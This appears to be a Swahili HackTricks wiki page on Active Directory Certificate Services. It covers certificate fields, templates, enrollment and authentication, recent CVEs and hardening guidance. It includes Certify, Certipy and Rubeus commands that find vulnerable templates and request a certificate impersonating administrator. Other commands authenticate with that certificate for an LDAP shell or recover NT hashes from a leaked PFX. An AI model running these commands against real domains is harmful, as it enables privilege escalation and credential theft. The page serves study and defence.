# Vyeti vya AD

{{#include ../../banners/hacktricks-training.md}}

## Utangulizi

### Vipengele vya Cheti

- **Subject** ya cheti huonyesha mmiliki wake.
- **Public Key** huunganishwa na ufunguo unaomilikiwa kwa faragha ili kuhusisha cheti na mmiliki wake halali.
- **Validity Period**, inayobainishwa na tarehe za **NotBefore** na **NotAfter**, huonyesha muda ambao cheti ni halali.
- **Serial Number** ya kipekee, inayotolewa na Certificate Authority (CA), hutambulisha kila cheti.
- **Issuer** humaanisha CA iliyotoa cheti.
- **SubjectAlternativeName** huruhusu majina ya ziada ya subject, na hivyo kuongeza unyumbufu wa utambulisho.
- **Basic Constraints** hubainisha kama cheti ni cha CA au entity ya mwisho, na kufafanua vizuizi vya matumizi.
- **Extended Key Usages (EKUs)** hufafanua madhumuni mahususi ya cheti, kama vile kusaini code au kusimba barua pepe, kupitia Object Identifiers (OIDs).
- **Signature Algorithm** hubainisha mbinu ya kusaini cheti.
- **Signature**, inayoundwa kwa kutumia private key ya issuer, huhakikisha uhalisi wa cheti.<sup>[[4]](#references)</sup>

### Mambo Maalum ya Kuzingatia

- **Subject Alternative Names (SANs)** huongeza matumizi ya cheti kwa utambulisho mbalimbali, jambo muhimu kwa server zenye domain nyingi. Michakato salama ya utoaji vyeti ni muhimu ili kuepuka hatari za attackers kujifanya wengine kwa kudanganya maelezo ya SAN.<sup>[[4]](#references)</sup>

### Certificate Authorities (CAs) katika Active Directory (AD)

AD CS hutambua vyeti vya CA katika AD forest kupitia containers maalum, ambazo kila moja ina jukumu lake:<sup>[[4]](#references)</sup>

- Container ya **Certification Authorities** huhifadhi vyeti vya trusted root CA.
- Container ya **Enrolment Services** hutoa maelezo kuhusu Enterprise CAs na certificate templates zao.
- Object ya **NTAuthCertificates** inajumuisha vyeti vya CA vilivyoidhinishwa kwa uthibitishaji wa AD.
- Container ya **AIA (Authority Information Access)** hurahisisha uthibitishaji wa certificate chain kwa kutumia vyeti vya intermediate na cross CA.

### Upatikanaji wa Cheti: Mchakato wa Ombi la Cheti kutoka kwa Client

1. Mchakato wa ombi huanza kwa clients kutafuta Enterprise CA.
2. CSR huundwa ikiwa na public key na maelezo mengine, baada ya kutengeneza jozi ya private-public key.
3. CA hukagua CSR dhidi ya certificate templates zilizopo, kisha hutoa cheti kulingana na ruhusa za template.
4. Baada ya kuidhinishwa, CA husaini cheti kwa kutumia private key yake na kumrudishia client.<sup>[[4]](#references)</sup>

### Certificate Templates

Zikifafanuliwa ndani ya AD, templates hizi hubainisha mipangilio na ruhusa za kutoa vyeti, ikijumuisha EKUs zinazoruhusiwa na haki za enrollment au urekebishaji. Hili ni muhimu katika kudhibiti ufikiaji wa huduma za vyeti.<sup>[[4]](#references)</sup>

**Toleo la schema la template ni muhimu.** Templates za zamani za **v1** (kwa mfano, template ya ndani ya **WebServer**) hazina vidhibiti kadhaa vya kisasa vya utekelezaji. Utafiti wa **ESC15/EKUwu** ulionyesha kuwa kwenye **v1 templates**, requester anaweza kupachika **Application Policies/EKUs** kwenye CSR, ambazo **hupewa kipaumbele kuliko** EKUs zilizosanidiwa kwenye template. Hili huwezesha kupata vyeti vya client-auth, enrollment agent au code-signing kwa kutumia haki za enrollment pekee. Pendelea **v2/v3 templates**, ondoa au badilisha defaults za v1, na punguza kwa ukali EKUs ili zilingane na madhumuni yaliyokusudiwa.<sup>[[1]](#references)</sup>

## Uandikishaji wa Vyeti

Mchakato wa enrollment ya vyeti huanzishwa na administrator **anayeunda certificate template**, kisha **huchapishwa** na Enterprise Certificate Authority (CA). Hii huifanya template ipatikane kwa client enrollment; hatua hii hufanywa kwa kuongeza jina la template kwenye sehemu ya `certificatetemplates` ya object ya Active Directory.<sup>[[4]](#references)</sup>

Ili client iweze kuomba cheti, ni lazima ipewe **haki za enrollment**. Haki hizi hufafanuliwa na security descriptors kwenye certificate template na Enterprise CA yenyewe. Ruhusa lazima zitolewe katika maeneo yote mawili ili ombi lifanikiwe.<sup>[[4]](#references)</sup>

### Haki za Enrollment za Template

Haki hizi hubainishwa kupitia Access Control Entries (ACEs), ambazo hueleza ruhusa kama vile:<sup>[[4]](#references)</sup>

- Haki za **Certificate-Enrollment** na **Certificate-AutoEnrollment**, kila moja ikihusishwa na GUID maalum.
- **ExtendedRights**, zinazoruhusu ruhusa zote zilizopanuliwa.
- **FullControl/GenericAll**, zinazotoa udhibiti kamili wa template.

### Haki za Enrollment za Enterprise CA

Haki za CA zimebainishwa kwenye security descriptor yake, inayoweza kufikiwa kupitia console ya usimamizi ya Certificate Authority. Baadhi ya mipangilio huruhusu hata users wenye mapendeleo madogo kufikia kwa mbali, jambo linaloweza kuwa hatari ya usalama.<sup>[[4]](#references)</sup>

### Vidhibiti vya Ziada vya Utoaji

Vidhibiti fulani vinaweza kutumika, kama vile:<sup>[[4]](#references)</sup>

- **Manager Approval**: Huacha maombi katika hali ya kusubiri hadi yaidhinishwe na certificate manager.
- **Enrolment Agents and Authorized Signatures**: Hubainisha idadi ya sahihi zinazohitajika kwenye CSR na Application Policy OIDs zinazohitajika.

### Mbinu za Kuomba Vyeti

Vyeti vinaweza kuombwa kupitia:<sup>[[4]](#references)</sup>

1. **Windows Client Certificate Enrollment Protocol** (MS-WCCE), kwa kutumia DCOM interfaces.
2. **ICertPassage Remote Protocol** (MS-ICPR), kupitia named pipes au TCP/IP.
3. **certificate enrollment web interface**, ikiwa role ya Certificate Authority Web Enrollment imesakinishwa.
4. **Certificate Enrollment Service** (CES), pamoja na huduma ya Certificate Enrollment Policy (CEP).
5. **Network Device Enrollment Service** (NDES) kwa vifaa vya mtandao, kwa kutumia Simple Certificate Enrollment Protocol (SCEP).

Watumiaji wa Windows wanaweza pia kuomba vyeti kupitia GUI (`certmgr.msc` au `certlm.msc`) au zana za command-line (`certreq.exe` au amri ya PowerShell ya `Get-Certificate`).

```bash
# Example of requesting a certificate using PowerShell
Get-Certificate -Template "User" -CertStoreLocation "cert:\\CurrentUser\\My"
```

## Uthibitishaji kwa Cheti

Active Directory (AD) inasaidia uthibitishaji kwa cheti, hasa kwa kutumia itifaki za **Kerberos** na **Secure Channel (Schannel)**.<sup>[[4]](#references)</sup>

### Mchakato wa Uthibitishaji wa Kerberos

Katika mchakato wa uthibitishaji wa Kerberos, ombi la mtumiaji la kupata Ticket Granting Ticket (TGT) husainiwa kwa kutumia **ufunguo wa faragha** wa cheti cha mtumiaji. Ombi hili hupitia uthibitishaji kadhaa na domain controller, ikiwemo **uhalali**, **mnyororo**, na **hali ya kubatilishwa** kwa cheti. Uthibitishaji pia huhakikisha kwamba cheti kimetoka kwenye chanzo kinachoaminika na kuthibitisha kuwa mtoaji yupo katika **hifadhi ya vyeti ya NTAUTH**. Uthibitishaji ukifaulu, TGT hutolewa. Kipengee cha **`NTAuthCertificates`** katika AD kinapatikana kwenye:

```bash
CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,DC=<domain>,DC=<com>
```

ni muhimu katika kuweka msingi wa uaminifu kwa uthibitishaji wa cheti.<sup>[[4]](#references)</sup>

Tangu kusambazwa kwa **KB5014754**, uthibitishaji wa kisasa wa Kerberos kwa cheti unahusu zaidi **nguvu ya ulinganishaji**, si EKU pekee.<sup>[[2]](#references)</sup> Katika misitu iliyoimarishwa:

- Cheti chenye **UPN/DNS SAN** pekee huenda kisitoshe tena kwa kuingia.
- KDC hupendelea **binding imara**, kwa kawaida **SID security extension** (`1.3.6.1.4.1.311.25.2`) au ulinganishaji imara uliobainishwa waziwazi katika `altSecurityIdentities`.
- Ikiwa cheti hakina ulinganishaji imara, DCs huandika **Kdcsvc Event ID 39/41** katika hali ya uoanifu na hukataa uthibitishaji katika hali ya utekelezaji.
- Katika njia mseto za mashambulizi, **ESC9/ESC16** ni muhimu kwa sababu huondoa SID extension kwenye vyeti vinavyotolewa; kisha waendeshaji hutegemea ulinganishaji uliobainishwa waziwazi au miundo ya SAN URL SID, pale ambapo njia ya shambulizi inaiunga mkono.

### Uthibitishaji wa Secure Channel (Schannel)

Schannel huwezesha miunganisho salama ya TLS/SSL. Wakati wa handshake, mteja huwasilisha cheti ambacho, kikithibitishwa kwa mafanikio, huruhusu ufikiaji.<sup>[[5]](#references)</sup> Ulinganishaji wa cheti na akaunti ya AD unaweza kuhusisha kitendakazi cha Kerberos cha **S4U2Self** au **Subject Alternative Name (SAN)** ya cheti, miongoni mwa mbinu nyingine.<sup>[[4]](#references)</sup>

Schannel pia ndiyo mbadala wa vitendo wakati **PKINIT** haipatikani. Kwa mfano, ikiwa domain controller haina cheti kinachofaa cha **Smart Card Logon**, zana za `certipy auth`/PKINIT zinaweza kushindwa kupata TGT, lakini cheti hicho hicho bado kinaweza kutumika dhidi ya **LDAPS** au **LDAP StartTLS** kwa uthibitishaji na shughuli za LDAP.

### Uhesabuji wa AD Certificate Services

Huduma za vyeti za AD zinaweza kuhesabiwa kupitia hoja za LDAP, zikifichua taarifa kuhusu **Enterprise Certificate Authorities (CAs)** na usanidi wake. Mtumiaji yeyote aliyejithibitisha kwenye domain anaweza kufikia taarifa hizi bila ruhusa maalum.<sup>[[4]](#references)</sup> Zana kama **[Certify](https://github.com/GhostPack/Certify)** na **[Certipy](https://github.com/ly4k/Certipy)** hutumika kwa uhesabuji na tathmini ya udhaifu katika mazingira ya AD CS.<sup>[[6]](#references)</sup>

Amri za kutumia zana hizi ni pamoja na:

```bash
# Enumerate trusted root CA certificates, Enterprise CAs, and web endpoints
Certify.exe cas

# Identify vulnerable templates and dump relevant permissions
Certify.exe find /vulnerable
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /showAdmins

# Certipy 5.x enumeration focused on enabled/vulnerable templates
certipy find -enabled -vulnerable -hide-admins -u john@corp.local -p Passw0rd -dc-ip 10.10.10.10

# Save JSON/CSV output for offline review or BloodHound correlation
certipy find -json -output corp_adcs -u john@corp.local -p Passw0rd -dc-ip 10.10.10.10

# Request a certificate over the Web Enrollment endpoint or DCOM/RPC
certipy req -web -ca corp-CA -target ca.corp.local -template WebServer -upn john@corp.local -dns www.corp.local
certipy req -ca corp-CA -target ca.corp.local -template User -upn administrator@corp.local -sid S-1-5-21-...-500

# Use the issued certificate either for PKINIT or directly for LDAP Schannel auth
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10 -ldap-shell

# Enumerate Enterprise CAs and certificate templates with certutil
certutil.exe -TCAInfo
certutil -v -dstemplate
```

### Bendera za uorodheshaji za Certify na PKINIT kwa kutumia Rubeus

Aina zifuatazo za command za Certify huhifadhi filters na chaguo za output zilizo tofauti.<sup>[[6]](#references)</sup>

```bash
# Enumerate trusted root CA certificates, Enterprise CAs and HTTP enrollment endpoints
# Useful flags: /domain, /path, /hideAdmins, /showAllPermissions, /skipWebServiceChecks
Certify.exe cas [/ca:SERVER\ca-name | /domain:domain.local | /path:CN=Configuration,DC=domain,DC=local] [/hideAdmins] [/showAllPermissions] [/skipWebServiceChecks]

# Identify vulnerable certificate templates and filter for common abuse cases
Certify.exe find
Certify.exe find /vulnerable [/currentuser]
Certify.exe find /enrolleeSuppliesSubject   # ESC1 candidates (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)
Certify.exe find /clientauth                # templates with client-auth EKU
Certify.exe find /showAllPermissions        # include template ACLs in output
Certify.exe find /json /outfile:C:\Temp\adcs.json

# Enumerate PKI object ACLs (Enterprise PKI container, templates, OIDs) – useful for ESC4/ESC7 discovery
Certify.exe pkiobjects [/domain:domain.local] [/showAdmins]

# Use Certipy for enumeration and identifying vulnerable templates
certipy find -vulnerable -u john@corp.local -p Passw0rd -dc-ip 172.16.126.128

# Enumerate Enterprise CAs and certificate templates with certutil
certutil.exe -TCAInfo
certutil -v -dstemplate
```

Rubeus pia inaweza kutumia cheti cha PFX kilicholindwa kwa nenosiri kwa uthibitishaji wa PKINIT na kuomba TGT. Swichi ya hiari `/getcredentials` huomba ticketi ya huduma ya U2U na kujaribu kurejesha NT hash ya akaunti:<sup>[[7]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:<USER> /certificate:C:\temp\leaked.pfx /password:<PFX_PASSWORD> /getcredentials /ptt
```

Kwa matumizi mabaya ya template na CA mahususi kwa ESC, angalia [AD CS Domain Escalation](ad-certificates/domain-escalation.md).

---

## Athari za Hivi Karibuni na Masasisho ya Usalama (2022-2025)

| Mwaka | ID / Jina | Athari | Mambo Muhimu ya Kuzingatia |
|------|-----------|--------|----------------|
| 2022 | **CVE-2022-26923** – “Certifried” / ESC6 | *Privilege escalation* kwa spoofing vyeti vya akaunti za mashine wakati wa PKINIT. | Patch imejumuishwa katika masasisho ya usalama ya **Mei 10, 2022**. Udhibiti wa ukaguzi na strong-mapping ulianzishwa kupitia **KB5014754**; mazingira yanapaswa sasa kuwa katika hali ya *Full Enforcement*.  |
| 2023 | **CVE-2023-35350 / 35351** | *Remote code-execution* katika majukumu ya AD CS Web Enrollment (certsrv) na CES. | Public PoCs ni chache, lakini vipengele vya IIS vilivyo hatarini mara nyingi vinafikiwa kutoka ndani ya mtandao. Fanya patch kupitia Patch Tuesday ya **Julai 2023**.  |
| 2024 | **CVE-2024-49019** – “EKUwu” / ESC15 | Kwenye **v1 templates**, mwombaji aliye na ruhusa za enrollment anaweza kujumuisha **Application Policies/EKUs** kwenye CSR, ambazo hupewa kipaumbele kuliko EKUs za template, na hivyo kutengeneza vyeti vya client-auth, enrollment agent au code-signing. | Ilifanyiwa patch kufikia **Novemba 12, 2024**. Badilisha au weka templates za v1 kuwa superseded (kwa mfano, WebServer ya chaguo-msingi), punguza EKUs ili yalingane na matumizi yaliyokusudiwa, na punguza ruhusa za enrollment. |

### Ratiba ya Microsoft ya kuimarisha usalama (KB5014754)

Microsoft ilianzisha rollout ya awamu tatu (Compatibility → Audit → Enforcement) ili kuondoa matumizi ya Kerberos certificate authentication ya implicit mappings dhaifu. Kufikia **Februari 11, 2025**, domain controllers hubadilika kiotomatiki kwenda **Full Enforcement** ikiwa thamani ya registry ya `StrongCertificateBindingEnforcement` haijawekwa. Baadaye Microsoft ilisasisha ratiba ili kuruhusu kurejea kwenye hali ya compatibility hadi sasisho la usalama la **Septemba 9, 2025**.<sup>[[2]](#references)</sup> Wasimamizi wanapaswa:

1. Kufanya patch kwenye DC zote na seva za AD CS (Mei 2022 au baadaye).
2. Kufuatilia Event ID 39/41 kwa weak mappings wakati wa awamu ya *Audit*.
3. Kutoa upya vyeti vya client-auth kwa kutumia **SID extension** mpya, au kusanidi strong manual mappings kabla enforcement haijazuia weak mappings.

### Dokezo kwa operators kuhusu forests zilizoimarishwa usalama

- **ESC1/ESC6 pekee hazitoshi tena kueleza hali nzima** katika mazingira ya 2025 na baadaye. Ukiomba cheti cha principal mwingine, kwa kawaida utahitaji pia strong mapping artifact kama SID extension au explicit mapping.
- **ESC15 (EKUwu)** ina thamani zaidi katika mazingira ambayo hayajafanyiwa patch, kwa sababu hubadilisha templates zisizo hatari za **v1** kama **WebServer** kuwa vyeti vinavyoweza kutumika kwa authentication au enrollment agent kwa kuingiza **Application Policies**. Kerberos PKINIT bado hukagua EKUs, lakini **LDAP Schannel** pia huzingatia Application Policies, hivyo matumizi mabaya yanayotegemea LDAP bado yanawezekana.<sup>[[1]](#references)</sup>
- **ESC16** ni mpangilio unaohusu CA nzima: CA ikizima SID security extension kote, kila cheti kinachotolewa huelekea kutumia tabia dhaifu zaidi ya mapping isipokuwa mnyororo wa shambulio uingize SID kupitia umbizo jingine linalotumika.
- **Ruhusa za ESC7 ni tofauti:** Ruhusa ya `ManageCA` kwenye CA inaweza kuruhusu mabadiliko ya mipangilio kama `EDITF_ATTRIBUTESUBJECTALTNAME2` (ESC6), ilhali `ManageCertificates` hudhibiti uidhinishaji wa maombi. Deny iliyo wazi kwenye ruhusa za certificate-manager inaweza kuzuia njia hiyo ya uidhinishaji hata kama Allow pia ipo; tathmini CA ACL inayotumika kabla ya kuunganisha mipangilio na templates. Angalia [tathmini ya CA ACL ya Microsoft](https://learn.microsoft.com/en-us/defender-for-identity/security-assessment-edit-vulnerable-ca-setting).

---

## Maboresho ya Ugunduzi na Uimarishaji wa Usalama

* **Defender for Identity AD CS sensor (2023-2024)** sasa huonyesha tathmini za hali ya usalama kwa ESC1-ESC8/ESC11 na hutoa arifa za wakati halisi kama *“Kutolewa kwa cheti cha domain controller kwa kifaa ambacho si DC”* (ESC8) na *“Zuia Certificate Enrollment yenye Application Policies zisizowekewa vikwazo”* (ESC15). Hakikisha sensors zimesakinishwa kwenye seva zote za AD CS ili kufaidika na ugunduzi huu.<sup>[[3]](#references)</sup>
* Zima au punguza kwa makini matumizi ya chaguo la **“Supply in the request”** kwenye templates zote; pendelea thamani za SAN/EKU zilizobainishwa wazi.
* Ondoa **Any Purpose** au **No EKU** kwenye templates isipokuwa zinahitajika kabisa (hushughulikia hali za ESC2).
* Hitaji **idhini ya msimamizi** au workflows maalumu za Enrollment Agent kwa templates nyeti (kwa mfano, WebServer / CodeSigning).
* Zuia ufikiaji wa web enrollment (`certsrv`) na vituo vya CES/NDES kwa mitandao inayoaminika, au viweke nyuma ya client-certificate authentication.
* Tekeleza usimbaji fiche wa RPC enrollment (`certutil -setreg CA\InterfaceFlags +IF_ENFORCEENCRYPTICERTREQUEST`) ili kupunguza hatari ya ESC11 (RPC relay). Flag hii **huwa imewashwa kwa chaguo-msingi**, lakini mara nyingi huzimwa kwa clients za zamani, na hivyo kufungua tena hatari ya relay.
* Linda **vituo vya enrollment vinavyotegemea IIS** (CES/Certsrv): zima NTLM inapowezekana au hitaji HTTPS + Extended Protection ili kuzuia ESC8 relays.

Tathmini ESC11 kwenye host inayoendesha CA, ambayo inaweza kuwa seva ya mwanachama wa domain badala ya domain controller. Soma `InterfaceFlags` ya CA inayotumika chini ya `HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration`; thamani isiyoweza kusomeka au ambayo haipo inaashiria matokeo yasiyojulikana, si uthibitisho kwamba usimbaji fiche wa RPC umezimwa. Bit ya `IF_ENFORCEENCRYPTICERTREQUEST` ikiwa haijawekwa, hiyo ni kidokezo cha usanidi ambacho bado kinahitaji endpoint ya enrollment RPC inayofikika, credentials zinazoweza kulazimishwa kutumwa, na certificate template inayoweza kutumika. Kwa ESC8, changamoto ya HTTP NTLM pekee haitoshi: thibitisha kuwa kuna endpoint ya enrollment inayofanya kazi.

---

## References

- [1] [EKUwu: Si ESC nyingine tu ya AD CS](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [2] [KB5014754: Mabadiliko ya certificate-based authentication kwenye Windows domain controllers](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [3] [Tathmini za hali ya usalama wa vyeti - Microsoft Defender for Identity](https://learn.microsoft.com/en-us/defender-for-identity/security-posture-assessments/certificates)
- [4] [Certified Pre-Owned: Matumizi mabaya ya Active Directory Certificate Services](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)
- [5] [Client Authentication ya SSL/TLS ni Nini na Hufanya Kazi Vipi?](https://comodosslstore.com/blog/what-is-ssl-tls-client-authentication-how-does-it-work.html)
- [6] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [7] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
{{#include ../../banners/hacktricks-training.md}}
